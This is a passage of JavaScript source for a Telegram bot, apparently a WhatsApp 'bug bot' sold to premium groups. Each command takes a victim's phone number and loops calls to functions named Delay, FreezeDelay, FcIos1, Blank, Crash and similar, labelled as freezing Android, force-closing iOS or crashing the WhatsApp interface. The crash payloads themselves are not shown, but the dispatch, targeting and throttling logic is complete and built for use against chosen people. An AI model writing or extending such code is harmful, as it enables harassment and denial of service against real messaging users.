  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxdelay 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Android ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await Delay(sock, target);
    await sleep(3000);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Android ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxperma", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxperma 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Permanen ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await DelayPerm(sock, target);
    await sleep(2500);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Permanen ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxcombo", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxcombo 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay × Freeze Android ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await FreezeDelay(sock, target);
    await sleep(2500);
    await FreezeDelay1(sock, target);
    await sleep(2500);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay × Freeze Android ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxip", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxip 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Force Ios ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await FcIos1(sock, target);
    await FcIos2(sock, target);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Force Ios ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxtrash", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxtrash 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Blank Invisible
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await InvBlank(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Blank Invisible 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxsystem", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxsystem 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Crash Ui
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await Blank(sock, target);
    await Blank1(sock, target);
    await Blank2(sock, target);
    await Blank3(sock, target);
    await Crash(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Crash Ui 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
bot.command("lxbuldo", checkWhatsAppConnection, async (ctx) => {

  if (!await validatePremiumGroup(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lxbuldo 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendMessage(ctx.chat.id, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Bulldozer ¿?
 - Status : Process 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  const speed = 70;
  const initialDelay = 3500;
  const delayIncrease = 500;
  const maxDelay = 25500;
  const resetThreshold = 60;
  const resetDuration = 2 * 60 * 1000;
  
  for (let i = 0; i < speed; i++) {
    const batchIndex = Math.floor(i / 15);
    let currentDelay = initialDelay + (batchIndex * delayIncrease);
    
    if (currentDelay > maxDelay) currentDelay = maxDelay;
    
    await new Promise(res => setTimeout(res, currentDelay));
    
    await BulDelay(sock, target);
    await sleep(2500);
    
    if ((i + 1) % resetThreshold === 0) {
      await new Promise(res => setTimeout(res, resetDuration));
    }
  }

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `
<blockquote><b>
╭───────────────────╮
 - Target: ${q}
 - Type Bug : Delay Bulldozer ¿? 
 - Status : Succes 
╰───────────────────╯
</b></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝗣𝗘𝗦𝗧", url: `https://wa.me/${q}` }
      ]]
    }
  });

});
// Bug Funct

// END Dek
bot.launch()
